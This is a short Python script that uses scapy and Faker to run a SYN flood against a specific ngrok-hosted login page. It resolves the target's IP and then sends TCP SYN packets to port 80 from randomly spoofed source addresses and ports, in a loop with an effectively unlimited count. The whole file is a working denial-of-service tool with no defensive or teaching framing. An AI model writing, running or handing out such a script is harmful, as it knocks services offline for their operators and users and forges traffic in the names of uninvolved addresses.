from scapy.all import IP, TCP, send
from faker import Faker
import random
import socket
from urllib.parse import urlparse

address = "https://salma-southmost-archimedes.ngrok-free.dev/login"
hostname = urlparse(address).hostname
ip = socket.gethostbyname(hostname)

print(f"Destination IP: {ip}")   

fake = Faker()

def Attack(dst_ip, dst_port, count):
    for i in range(count):
        src_ip = fake.ipv4()
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(1000, 9000)
        
        ip = IP(src= src_ip, dst = dst_ip)
        tcp = TCP(sport=src_port, dport=dst_port, flags="S", seq=seq_num)
        packet = ip/tcp

        send(packet, verbose=False)
        print(f"Sent {i+1} syn packet")
    pass

Attack(ip, 80, 1000000000000000000)